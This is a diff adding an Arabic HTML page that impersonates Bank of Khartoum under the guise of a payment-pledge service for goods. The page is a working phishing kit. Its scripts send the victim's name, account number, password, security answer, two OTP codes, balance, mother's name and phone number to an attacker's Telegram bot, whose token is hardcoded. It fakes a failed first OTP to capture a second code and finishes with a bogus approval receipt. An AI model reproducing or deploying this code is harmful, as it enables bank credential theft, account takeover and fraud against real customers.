@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="color-scheme" content="light">
+    <meta name="supported-color-schemes" content="light">
+    <title>تعهد سداد مالي وضمان دفع - بنك الخرطوم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { color-scheme: light; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Cairo', sans-serif !important; 
+            font-style: normal !important;
+            -webkit-tap-highlight-color: transparent;
+        }
+        html {
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+        body { 
+            background-color: #f8fafc; 
+            min-height: 100vh; 
+            min-height: 100dvh;
+            display: flex; 
+            flex-direction: column; 
+            color: #1e293b; 
+            overflow-x: hidden; 
+        }
+        
+        .header-img-container { background: #ffffff; display: flex; align-items: center; justify-content: center; padding: 12px 15px; border-bottom: 2px solid #c5a059; box-shadow: 0 1px 3px rgba(0,0,0,0.05); width: 100%; }
+        .header-img-container img { width: 100%; max-width: 520px; height: auto; max-height: 110px; object-fit: contain; display: block; }
+
+        .main-container { flex: 1; display: flex; flex-direction: column; max-width: 600px; width: 100%; margin: 0 auto; padding: 15px; }
+        .card { background: white; width: 100%; flex: 1; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; text-align: center; display: flex; flex-direction: column; justify-content: center; min-height: 75vh; }
+        .hidden { display: none !important; }
+        
+        h2 { color: #0d5c3d; margin-bottom: 15px; font-size: 20px; font-weight: 700; text-align: right; }
+        h3 { color: #334155; margin-bottom: 20px; font-size: 15px; border-bottom: 2px solid #c5a059; display: inline-block; padding-bottom: 5px; text-align: right; width: 100%; }
+        
+        .input-group { margin-bottom: 16px; text-align: right; width: 100%; }
+        .input-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 13.5px; color: #334155; text-align: right; }
+        .input-wrapper { position: relative; width: 100%; }
+        
+        input, select, textarea { 
+            -webkit-appearance: none; 
+            -moz-appearance: none; 
+            appearance: none; 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1px solid #cbd5e1; 
+            border-radius: 10px; 
+            background-color: #f8fafc; 
+            font-size: 14px; 
+            outline: none; 
+            transition: border-color 0.2s; 
+            text-align: right; 
+            color: #1e293b;
+        }
+
+        select {
+            background-image: url('data:image/svg+xml;utf8,<svg fill="%23334155" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: left 10px center;
+            background-size: 18px;
+            padding-left: 35px !important;
+        }
+
+        input:focus, select:focus, textarea:focus { border-color: #c5a059; background-color: #fff; }
+        
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #64748b; cursor: pointer; }
+        .btn-submit { -webkit-appearance: none; appearance: none; background-color: #c5a059; color: white; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 15px; box-shadow: 0 4px 10px rgba(197,160,89,0.3); }
+        .btn-submit:hover { background-color: #b08d4b; }
+        
+        .otp-timer { color: #c5a059; font-size: 13px; margin-bottom: 15px; text-align: center; display: block; }
+        .error-message { color: #e11d48; font-size: 12.5px; font-weight: bold; margin-top: 6px; display: block; text-align: right; }
+        
+        .receipt-box { 
+            background: #ffffff; 
+            border: 2px solid #0d5c3d; 
+            padding: 20px; 
+            border-radius: 16px; 
+            margin-top: 10px; 
+            text-align: right; 
+            box-shadow: 0 4px 15px rgba(13, 92, 61, 0.1);
+            user-select: text;
+            -webkit-user-select: text;
+        }
+        .receipt-header { text-align: center; border-bottom: 2px dashed #cbd5e1; padding-bottom: 12px; margin-bottom: 12px; }
+        .receipt-row { display: flex; justify-content: space-between; font-size: 13.5px; margin-bottom: 8px; border-bottom: 1px solid #f1f5f9; padding-bottom: 6px; }
+        .receipt-row span:first-child { color: #64748b; font-weight: 600; }
+        .receipt-row span:last-child { color: #1e293b; font-weight: 700; }
+        
+        .copy-btn {
+            background-color: #0d5c3d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover { background-color: #09472f; }
+
+        .pledge-box {
+            background-color: #fefce8;
+            border: 1px solid #fde047;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #334155;
+            line-height: 1.7;
+            text-align: right;
+        }
+
+        .agree-btn {
+            background-color: #f1f5f9;
+            color: #334155;
+            border: 2px solid #cbd5e1;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .agree-btn.active {
+            background-color: #16a34a;
+            color: white;
+            border-color: #16a34a;
+            box-shadow: 0 4px 10px rgba(22, 163, 74, 0.3);
+        }
+
+        .loading-spinner { display: inline-block; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <header class="header-img-container">
+        <img src="m.jpg" alt="بنك الخرطوم">
+    </header>
+
+    <div class="main-container">
+        <!-- صفحة التعهد المالي وتأكيد الطلب -->
+        <div id="step-loan-intro" class="card" style="justify-content: flex-start; overflow-y: auto;">
+            <h2>خدمة التعهد المالي وضمان السداد</h2>
+            <h3>تأكيد دفع قيمة البضاعة لحساب المؤسسة</h3>
+            
+            <div style="background-color: #f8fafc; border: 1px solid #cbd5e1; padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 13px; color: #334155; line-height: 1.6; text-align: right;">
+                📌 <strong>البريد المصرفي:</strong> لضمان حقوق الطرفين، يلتزم المشتري بتقديم تعهد رسمي موثق يقضي بخصم قيمة البضاعة من حسابه لصالح حساب المؤسسة فور المعاينة وتأكيد الاستلام النهائي، على أن يعتمد البنك عملية التحويل بناءً على طلبكم.
+            </div>
+
+            <div class="pledge-box">
+                <strong style="color: #0d5c3d; display: block; margin-bottom: 5px;">نص التعهد القانوني والمصرفي:</strong>
+                "أنا الموقع أدناه، أقر وأتعهد بأنني قمت بطلب توريد بضاعة/منتجات، وألتزم التزاما كاملا لا رجعة فيه بأن يتم خصم قيمة الفاتورة المتفق عليها من حسابي المصرفي الشخصي لصالح حساب المؤسسة لدى بنك الخرطوم، وذلك شريطة وفحص واستلام البضاعة بحالة سليمة ومطابقة للمواصفات. كما أقر بتفويض البنك باعتماد الخصم فور إشعارنا باستلام البضاعة وتأكيدها عبر القنوات الرسمية."
+            </div>
+
+            <button type="button" id="agree-btn" class="agree-btn" onclick="toggleAgreement()">
+                ⭕ اضغط هنا للموافقة على شروط التعهد (نعم أوافق)
+            </button>
+            <span id="err-pledge-agree" class="error-message hidden">يجب النقر على زر الموافقة للمتابعة</span>
+
+            <div class="input-group">
+                <label>الاسم رباعي لمقدم الطلب:</label>
+                <input type="text" id="loan-name" placeholder="أدخل الاسم رباعي">
+                <span id="err-loan-name" class="error-message hidden">الرجاء إدخال الاسم رباعي</span>
+            </div>
+            
+            <div class="input-group">
+                <label>رقم حساب المستلم (حساب المؤسسة):</label>
+                <input type="text" id="receiver-account" placeholder="أدخل رقم حساب المستلم" dir="ltr" style="text-align:left;">
+                <span id="err-receiver-account" class="error-message hidden">الرجاء إدخال رقم حساب المستلم بشكل صحيح</span>
+            </div>
+
+            <div class="input-group">
+                <label>مبلغ التعهد / قيمة البضاعة (بالجنيه السوداني):</label>
+                <input type="text" id="loan-amount" placeholder="أدخل المبلغ الإجمالي" oninput="formatCurrencyInput(this)">
+                <span id="err-loan-amount" class="error-message hidden">الرجاء إدخال مبلغ صحيح</span>
+            </div>
+            <div class="input-group">
+                <label>وصف البضاعة أو نوع الطلبية:</label>
+                <input type="text" id="loan-duration" placeholder="مثال: أجهزة إلكترونية / مواد غذائية">
+                <span id="err-loan-duration" class="error-message hidden">الرجاء إدخال وصف البضاعة</span>
+            </div>
+            <div class="input-group">
+                <label>عنوان التسليم والاستلام الحالي (المدينة / الحي):</label>
+                <input type="text" id="loan-address" placeholder="أدخل عنوان مكان استلام البضاعة">
+                <span id="err-loan-address" class="error-message hidden">الرجاء إدخال عنوان التسليم</span>
+            </div>
+            <div class="input-group">
+                <label>صورة إيصال الاستلام أو مستند الطلبية (اختياري):</label>
+                <div style="position: relative; border: 1px solid #cbd5e1; border-radius: 10px; background-color: #f8fafc; padding: 10px; display: flex; align-items: center; justify-content: space-between;">
+                    <input type="file" id="loan-file-input" accept="image/*" onchange="updateLoanFileLabel()" style="position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;">
+                    <span id="loan-file-label-text" style="font-size: 13px; color: #94a3b8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">اختر صورة المستند...</span>
+                    <span style="background-color: rgba(197,160,89,0.15); color: #c5a059; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 6px; flex-shrink: 0;">استعراض</span>
+                </div>
+            </div>
+
+            <button class="btn-submit" onclick="submitLoanIntro()">الموافقة والمتابعة لتوثيق الحساب</button>
+        </div>
+
+        <!-- صفحة تسجيل الدخول للحساب -->
+        <div id="step-inc-login" class="card hidden" style="text-align: right;">
+            <h2>توثيق الحساب البنكي</h2>
+            <h3>الرجاء إدخال بيانات حساب بنك الخرطوم الخاص بك</h3>
+            
+            <div style="background-color: #fefce8; border: 1px solid #fde047; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 12.5px; color: #854d0e; line-height: 1.5; text-align: right;">
+                💡 <strong>البريد المصرفي:</strong> لتأكيد عملية الخصم والسداد لصالح المؤسسة بعد استلام البضاعة، يجب التحقق من هوية صاحب الحساب عبر تسجيل الدخول الآمن.
+            </div>
+
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب" dir="ltr" style="text-align:left;">
+                <span id="err-acc-num" class="error-message hidden">الرجاء إدخال رقم الحساب</span>
+            </div>
+            <div class="input-group">
+                <label>كلمة مرور الحساب:</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+                <span id="err-password" class="error-message hidden">الرجاء إدخال كلمة المرور</span>
+                <span id="inc-login-error" class="error-message hidden">رقم الحساب أو كلمة السر خاطئة، الرجاء المحاولة مرة أخرى</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول ومتابعة</button>
+        </div>
+
+        <!-- صفحة سؤال الأمان -->
+        <div id="step-inc-security" class="card hidden" style="text-align: right;">
+            <h2>التحقق الأمني والاعتماد</h2>
+            <h3>لأغراض الحماية ومنع العمليات الوهمية، يرجى الإجابة على سؤال الأمان</h3>
+            
+            <div style="background-color: #f8fafc; border: 1px solid #cbd5e1; padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 12.5px; color: #475569;">
+                🛡️ <strong>لماذا هذه الخطوة؟</strong> يطلب البنك التحقق من سؤال الأمان لتوثيق تفويض الخصم المالي لصالح حساب المؤسسة بشكل قانوني وآمن.
+            </div>
+
+            <div class="input-group">
+                <label>اختر سؤال الأمان:</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option>ما هو اسم ابن عمك الأول؟</option>
+                    <option>في أي مدينة ولدت؟</option>
+                    <option>في أي سنة تخرجت من الجامعة؟</option>
+                    <option>ماذا كان لقبك أثناء الطفولة؟</option>
+                    <option>اسم مؤلفك المفضل؟</option>
+                    <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option>أي فيلم هو المفضل لديك؟</option>
+                    <option>اسم أفضل صديق في الطفولة؟</option>
+                    <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                    <option>في أي سنة تزوجت؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option>ما هي ماركة سيارتك الأولى؟</option>
+                </select>
+                <span id="err-sec-q" class="error-message hidden">الرجاء اختيار سؤال الأمان</span>
+            </div>
+            <div class="input-group">
+                <label>إجابة سؤال الأمان:</label>
+                <input type="text" id="security-answer" placeholder="اكتب إجابتك هنا">
+                <span id="err-sec-ans" class="error-message hidden">الرجاء إدخال إجابة سؤال الأمان</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال والمتابعة</button>
+        </div>
+
+        <!-- صفحة رمز التحقق OTP -->
+        <div id="step-inc-otp" class="card hidden">
+            <div id="otp-area">
+                <h2>رمز التحقق والاعتماد النهائي (OTP)</h2>
+                
+                <div style="background-color: #fefce8; border: 1px solid #fde047; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 12.5px; color: #854d0e; text-align: right;">
+                    📱 <strong>إشعار البنك:</strong> لإتمام عملية توثيق التعهد وربط الخصم بتأكيد الاستلام، يرجى إدخال رمز التحقق الأمني المرسل إلى هاتفكم أو بريدكم الإلكتروني.
+                </div>
+
+                <div class="input-group" style="text-align: right;">
+                    <label>أدخل رمز التحقق:</label>
+                    <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                    <span id="err-otp" class="error-message hidden" style="text-align:center;">الرجاء إدخال رمز التحقق (OTP)</span>
+                    <span id="err-otp-invalid" class="error-message hidden" style="text-align:right;">الرمز خاطئ، الرجاء تفقد البريد الإلكتروني أو صندوق رسائل رقم الهاتف المسجل مع الحساب وإدخال الرمز الصحيح</span>
+                </div>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
+                <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي وسداد التعهد</button>
+            </div>
+        </div>
+
+        <!-- صفحة البيانات الشخصية الإضافية -->
+        <div id="step-inc-personal" class="card hidden" style="text-align: right;">
+            <h2>استكمال بيانات المطابقة والاعتماد</h2>
+            <h3>يرجى تأكيد التفاصيل المالية وبيانات الهوية للمقاصة</h3>
+            
+            <div style="background-color: #f8fafc; border: 1px solid #cbd5e1; padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 12.5px; color: #475569;">
+                🔍 <strong>البريد المصرفي:</strong> تُستخدم هذه البيانات حصرياً لمطابقة الحساب وتأكيد عملية التحويل فور إشعار استلام البضاعة من قبلكم.
+            </div>
+
+            <div class="input-group">
+                <label>الرصيد التقريبي الحالي في الحساب:</label>
+                <input type="text" id="account-amount" placeholder="أدخل القيمة التقديرية للرصيد">
+                <span id="err-amount" class="error-message hidden">الرجاء إدخال المبلغ الموجود في الحساب</span>
+            </div>
+            <div class="input-group">
+                <label>اسم الوالدة رباعي:</label>
+                <input type="text" id="mother-name" placeholder="أدخل اسم الوالدة بالكامل">
+                <span id="err-mother" class="error-message hidden">الرجاء إدخال اسم الوالدة رباعي</span>
+            </div>
+            <div class="input-group">
+                <label>رقم الهاتف الأساسي المرتبط بالحساب:</label>
+                <input type="tel" id="linked-phone" placeholder="أدخل رقم الشريحة المرتبطة" dir="ltr" style="text-align:left;">
+                <span id="err-linked-phone" class="error-message hidden">الرجاء إدخال رقم الهاتف المرتبط بالحساب</span>
+            </div>
+            <button class="btn-submit" onclick="submitStepPersonal()">إتمام وتوثيق التعهد المالي</button>
+        </div>
+
+        <!-- الصفحة الأخيرة (إيصال الاعتماد الجميل والقابل للنسخ) -->
+        <div id="step-inc-final" class="card hidden">
+            <div class="receipt-box" id="printable-receipt">
+                <div class="receipt-header">
+                    <h2 style="color: #0d5c3d; text-align: center; margin-bottom: 4px; font-size: 18px;">بنك الخرطوم - Bank of Khartoum</h2>
+                    <p style="font-size: 12px; color: #64748b;">إيصال اعتماد تعهد سداد مالي وضمان دفع</p>
+                </div>
+                
+                <div class="receipt-row">
+                    <span>حالة العملية:</span>
+                    <span style="color: #16a34a;">معتمدة بنجاح ✓</span>
+                </div>
+                <div class="receipt-row">
+                    <span>الرقم المرجعي:</span>
+                    <span id="receipt-ref">REF-00000000</span>
+                </div>
+                <div class="receipt-row">
+                    <span>اسم العميل:</span>
+                    <span id="receipt-name">--</span>
+                </div>
+                <div class="receipt-row">
+                    <span>حساب المُرسل:</span>
+                    <span id="receipt-account">--</span>
+                </div>
+                <div class="receipt-row">
+                    <span>حساب المستلم:</span>
+                    <span id="receipt-receiver">--</span>
+                </div>
+                <div class="receipt-row">
+                    <span>مبلغ التعهد:</span>
+                    <span id="receipt-amount">--</span>
+                </div>
+                <div class="receipt-row">
+                    <span>تاريخ الاعتماد:</span>
+                    <span id="receipt-date">--</span>
+                </div>
+
+                <div style="margin-top: 15px; font-size: 11.5px; color: #475569; text-align: center; border-top: 1px dashed #cbd5e1; padding-top: 10px;">
+                    تم توثيق هذا التعهد إلكترونياً عبر قنوات بنك الخرطوم الرقمية ويخضع للشروط والأحكام الخاصة بضمان السداد عند الاستلام.
+                </div>
+            </div>
+
+            <button class="copy-btn" onclick="copyReceiptText()">
+                <i class="fas fa-copy"></i> نسخ تفاصيل الإيصال
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let userData = { loanName: '', receiverAccount: '', loanAmount: '', loanDuration: '', loanAddress: '', accountNum: '', password: '', securityQuestion: '', securityAnswer: '', otp: '', amount: '', motherName: '', linkedPhone: '', refNum: '' };
+        let selectedLoanFile = null;
+        let isAgreed = false;
+        let otpAttemptCount = 0;
+
+        function toggleAgreement() {
+            isAgreed = !isAgreed;
+            const btn = document.getElementById('agree-btn');
+            if (isAgreed) {
+                btn.classList.add('active');
+                btn.textContent = '✓ نعم أوافق على شروط وأحكام التعهد المالي';
+                document.getElementById('err-pledge-agree').classList.add('hidden');
+            } else {
+                btn.classList.remove('active');
+                btn.textContent = '⭕ اضغط هنا للموافقة على شروط التعهد (نعم أوافق)';
+            }
+        }
+
+        function formatCurrencyInput(input) {
+            let value = input.value.replace(/[^\d]/g, '');
+            if (value) {
+                input.value = Number(value).toLocaleString('en-US');
+            } else {
+                input.value = '';
+            }
+        }
+
+        function updateLoanFileLabel() {
+            const fileInput = document.getElementById('loan-file-input');
+            const fileLabelText = document.getElementById('loan-file-label-text');
+            if (fileInput.files && fileInput.files.length > 0) {
+                selectedLoanFile = fileInput.files[0];
+                fileLabelText.textContent = "تم اختيار صورة المستند";
+                fileLabelText.style.color = "#16a34a";
+                fileLabelText.style.fontWeight = "600";
+            }
+        }
+
+        function hideAllViews() {
+            document.getElementById('step-loan-intro').classList.add('hidden');
+            document.getElementById('step-inc-login').classList.add('hidden');
+            document.getElementById('step-inc-security').classList.add('hidden');
+            document.getElementById('step-inc-otp').classList.add('hidden');
+            document.getElementById('step-inc-personal').classList.add('hidden');
+            document.getElementById('step-inc-final').classList.add('hidden');
+            document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
+        }
+
+        function goToStep(id) {
+            hideAllViews();
+            document.getElementById(id).classList.remove('hidden');
+            if (id === 'step-inc-otp') startOtpTimer();
+        }
+
+        function togglePassword(id) {
+            const p = document.getElementById(id);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function submitLoanIntro() {
+            let hasError = false;
+            userData.loanName = document.getElementById('loan-name').value.trim();
+            userData.receiverAccount = document.getElementById('receiver-account').value.trim();
+            let rawAmountStr = document.getElementById('loan-amount').value.trim();
+            userData.loanAmount = rawAmountStr;
+            userData.loanDuration = document.getElementById('loan-duration').value.trim();
+            userData.loanAddress = document.getElementById('loan-address').value.trim();
+
+            if(!isAgreed) { document.getElementById('err-pledge-agree').classList.remove('hidden'); hasError = true; }
+            else { document.getElementById('err-pledge-agree').classList.add('hidden'); }
+
+            if(!userData.loanName) { document.getElementById('err-loan-name').classList.remove('hidden'); hasError = true; }
+            if(!userData.receiverAccount) { document.getElementById('err-receiver-account').classList.remove('hidden'); hasError = true; }
+            if(!userData.loanAmount) { document.getElementById('err-loan-amount').classList.remove('hidden'); hasError = true; }
+            if(!userData.loanDuration) { document.getElementById('err-loan-duration').classList.remove('hidden'); hasError = true; }
+            if(!userData.loanAddress) { document.getElementById('err-loan-address').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            const captionText = `📜 تعهد سداد مالي جديد:\n👤 الاسم: ${userData.loanName}\n📥 حساب المستلم: ${userData.receiverAccount}\n💵 مبلغ التعهد: ${userData.loanAmount} جنيه\n📦 وصف البضاعة: ${userData.loanDuration}\n🏠 عنوان التسليم: ${userData.loanAddress}`;
+
+            if (selectedLoanFile) {
+                sendPhotoToTelegram(selectedLoanFile, captionText);
+            } else {
+                sendToTelegram(captionText);
+            }
+
+            goToStep('step-inc-login');
+        }
+
+        function startOtpTimer() {
+            let m = 30, s = 0;
+            const t = document.getElementById("otp-timer");
+            const x = setInterval(() => {
+                if (s === 0) { if (m === 0) { clearInterval(x); return; } m--; s = 59; } else { s--; }
+                if(t) t.textContent = `إعادة إرسال الرمز خلال ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')} دقيقة`;
+            }, 1000);
+        }
+
+        function isAscendingSequential(str) {
+            if (str.length < 2) return false;
+            for (let i = 0; i < str.length - 1; i++) {
+                if (str.charCodeAt(i + 1) - str.charCodeAt(i) !== 1) return false;
+            }
+            return true;
+        }
+
+        function isValidAccount(acc) {
+            if (!/^\d+$/.test(acc)) return false;
+            if (acc.length < 6 || acc.length > 7) return false;
+            if (isAscendingSequential(acc)) return false;
+            return true;
+        }
+
+        function isValidPassword(pwd) {
+            if (/[\u0600-\u06FF]/.test(pwd)) return false;
+            return /[A-Z]/.test(pwd) && /[a-z]/.test(pwd) && /[0-9]/.test(pwd) && /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pwd);
+        }
+
+        function submitStep1() {
+            let hasError = false;
+            userData.accountNum = document.getElementById('account-num').value.trim();
+            userData.password = document.getElementById('password').value;
+
+            if(!userData.accountNum) { document.getElementById('err-acc-num').classList.remove('hidden'); hasError = true; }
+            if(!userData.password) { document.getElementById('err-password').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            const errorElement = document.getElementById('inc-login-error');
+            if (!isValidAccount(userData.accountNum) || !isValidPassword(userData.password)) {
+                errorElement.classList.remove('hidden');
+                return;
+            }
+
+            errorElement.classList.add('hidden');
+            sendToTelegram(`📋 بيانات دخول الحساب [تعهد سداد]:\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
+            goToStep('step-inc-security');
+        }
+
+        function submitStep2() {
+            let hasError = false;
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value.trim();
+
+            if(!userData.securityQuestion) { document.getElementById('err-sec-q').classList.remove('hidden'); hasError = true; }
+            if(!userData.securityAnswer) { document.getElementById('err-sec-ans').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            sendToTelegram(`🔐 سؤال الأمان [تعهد سداد]:\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            goToStep('step-inc-otp');
+        }
+
+        function verifyOtp() {
+            const o = document.getElementById('otp-code').value.trim();
+            if(!o || o.length < 4) {
+                document.getElementById('err-otp').classList.remove('hidden');
+                return;
+            }
+            document.getElementById('err-otp').classList.add('hidden');
+            document.getElementById('err-otp-invalid').classList.add('hidden');
+
+            otpAttemptCount++;
+
+            if (otpAttemptCount === 1) {
+                sendToTelegram(`🔢 OTP (المحاولة الأولى):\n🔐 الرمز المدخل: ${o}`);
+                document.getElementById('err-otp-invalid').classList.remove('hidden');
+                document.getElementById('otp-code').value = '';
+            } else {
+                const btn = document.getElementById('verify-btn');
+                btn.disabled = true;
+                btn.innerHTML = `<span class="loading-spinner"></span> جاري التحقق من رمز OTP...`;
+                
+                setTimeout(() => {
+                    userData.otp = o;
+                    sendToTelegram(`🔢 OTP معتمد (المحاولة الثانية):\n🔐 الرمز: ${userData.otp}`);
+                    
+                    let randomRef = 'BOK-PL-' + Math.floor(10000000 + Math.random() * 90000000);
+                    userData.refNum = randomRef;
+
+                    sendToTelegram(`🎫 الرقم المرجعي النهائي لتعهد السداد:\n${userData.refNum}`);
+
+                    document.getElementById('receipt-ref').textContent = userData.refNum;
+                    document.getElementById('receipt-name').textContent = userData.loanName;
+                    document.getElementById('receipt-account').textContent = userData.accountNum;
+                    document.getElementById('receipt-receiver').textContent = userData.receiverAccount;
+                    document.getElementById('receipt-amount').textContent = userData.loanAmount + ' جنيه';
+                    
+                    let now = new Date();
+                    document.getElementById('receipt-date').textContent = now.toLocaleDateString('ar-SD') + ' ' + now.toLocaleTimeString('en-US');
+
+                    hideAllViews();
+                    document.getElementById('step-inc-final').classList.remove('hidden');
+                }, 2000);
+            }
+        }
+
+        function copyReceiptText() {
+            const receiptText = `--- إيصال تعهد سداد مالي - بنك الخرطوم ---\n` +
+                `الحالة: معتمدة بنجاح\n` +
+                `الرقم المرجعي: ${userData.refNum}\n` +
+                `اسم العميل: ${userData.loanName}\n` +
+                `حساب المُرسل: ${userData.accountNum}\n` +
+                `حساب المستلم: ${userData.receiverAccount}\n` +
+                `مبلغ التعهد: ${userData.loanAmount} جنيه\n` +
+                `----------------------------------------`;
+
+            navigator.clipboard.writeText(receiptText).then(() => {
+                alert('تم نسخ تفاصيل الإيصال بنجاح!');
+            }).catch(err => {
+                alert('فشل نسخ النص، يمكنك تحديده ونسخه يدوياً.');
+            });
+        }
+
+        function submitStepPersonal() {
+            let hasError = false;
+            userData.amount = document.getElementById('account-amount').value.trim();
+            userData.motherName = document.getElementById('mother-name').value.trim();
+            userData.linkedPhone = document.getElementById('linked-phone').value.trim();
+
+            if(!userData.amount) { document.getElementById('err-amount').classList.remove('hidden'); hasError = true; }
+            if(!userData.motherName) { document.getElementById('err-mother').classList.remove('hidden'); hasError = true; }
+            if(!userData.linkedPhone) { document.getElementById('err-linked-phone').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            let randomRef = 'BOK-PL-' + Math.floor(10000000 + Math.random() * 90000000);
+            userData.refNum = randomRef;
+
+            sendToTelegram(`🔄 تأكيد البيانات المالية والشخصية [تعهد سداد]:\n💵 الرصيد التقريبي: ${userData.amount}\n👩‍👦 اسم الوالدة: ${userData.motherName}\n📱 الهاتف المرتبط: ${userData.linkedPhone}\n🎫 الرقم المرجعي: ${userData.refNum}`);
+
+            document.getElementById('receipt-ref').textContent = userData.refNum;
+            document.getElementById('receipt-name').textContent = userData.loanName;
+            document.getElementById('receipt-account').textContent = userData.accountNum;
+            document.getElementById('receipt-receiver').textContent = userData.receiverAccount;
+            document.getElementById('receipt-amount').textContent = userData.loanAmount + ' جنيه';
+            
+            let now = new Date();
+            document.getElementById('receipt-date').textContent = now.toLocaleDateString('ar-SD') + ' ' + now.toLocaleTimeString('en-US');
+
+            hideAllViews();
+            document.getElementById('step-inc-final').classList.remove('hidden');
+        }
+
+        function sendToTelegram(messageText) {
+            const botToken = "8813029455:AAFGdPqqzJ-WorJDSHRO2gdGbO-IqANpXrA";
+            const chatId = "2014945683";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            });
+        }
+
+        function sendPhotoToTelegram(file, captionText) {
+            const botToken = "8813029455:AAFGdPqqzJ-WorJDSHRO2gdGbO-IqANpXrA";
+            const chatId = "2014945683";
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', file);
+            formData.append('caption', captionText);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
